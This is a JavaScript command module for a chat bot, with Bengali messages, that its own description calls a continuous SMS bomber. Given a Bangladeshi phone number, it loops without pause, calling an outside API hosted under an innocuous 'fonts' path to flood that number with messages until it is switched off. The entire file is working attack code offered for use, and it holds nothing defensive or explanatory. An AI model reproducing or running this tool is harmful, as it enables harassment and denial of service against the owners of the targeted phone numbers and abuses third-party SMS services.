module.exports.config = {
  name: "sms",
  version: "2.0.0",
  hasPermssion: 0,
  credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️", //ক্রেডিট চেঞ্জ করলে এপিআই বন্ধ করে দেব।
  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};
 
const axios = require("axios");
const bombingFlags = {};
 
module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];
 
  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("✅ SMS BOMBER 1 Offed ।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }
 
  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("•┄┅════❁🌺❁════┅┄•\n\nSMS BOMBER 1\n\nব্যবহার:\n.sms number\n\n(BD Number Only)\n\n•┄┅════❁🌺❁════┅┄•", threadID);
  }
 
  if (bombingFlags[threadID]) {
    return api.sendMessage("❗sms bomber 1 already on off korte .sms off", threadID);
  }
 
  api.sendMessage(`✅ SMS BOMBER 1 ON  ${number} ...\nOff korte .sms off`, threadID);
 
  bombingFlags[threadID] = true;
 
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
